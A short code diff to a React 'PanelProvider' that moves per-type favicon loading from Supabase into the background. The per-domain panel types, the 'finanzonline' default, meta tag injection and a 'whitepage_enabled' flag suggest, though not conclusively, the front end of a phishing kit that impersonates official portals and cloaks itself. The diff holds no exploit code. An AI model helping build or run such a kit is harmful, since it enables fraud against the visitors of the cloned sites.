@@ -79,20 +79,22 @@ export const PanelProvider = ({ children }: PanelProviderProps) => {
         const metaTagSnippet = matched ? ((data as any)?.meta_tag_snippet ?? null) : null;
         const whitepageEnabled = matched && !!(data as any)?.whitepage_enabled;
         setValue({ type, domain: host, matched, metaTagEnabled, metaTagSnippet, whitepageEnabled });
+        setReady(true);
 
-        // Per-Typ-Favicon laden und anwenden
-        const { data: settings } = await supabase
+        // Per-Typ-Favicon im Hintergrund laden – blockiert den Redirect nicht
+        supabase
           .from("panel_type_settings")
           .select("favicon_url")
           .eq("type", type)
-          .maybeSingle();
-        if (!cancelled && settings?.favicon_url) {
-          applyFavicon(settings.favicon_url);
-        }
+          .maybeSingle()
+          .then(({ data: settings }) => {
+            if (!cancelled && settings?.favicon_url) applyFavicon(settings.favicon_url);
+          });
       } catch {
-        if (!cancelled) setValue({ type: "finanzonline", domain: host, matched: false, metaTagEnabled: false, metaTagSnippet: null, whitepageEnabled: false });
-      } finally {
-        if (!cancelled) setReady(true);
+        if (!cancelled) {
+          setValue({ type: "finanzonline", domain: host, matched: false, metaTagEnabled: false, metaTagSnippet: null, whitepageEnabled: false });
+          setReady(true);
+        }
       }
     })();
 
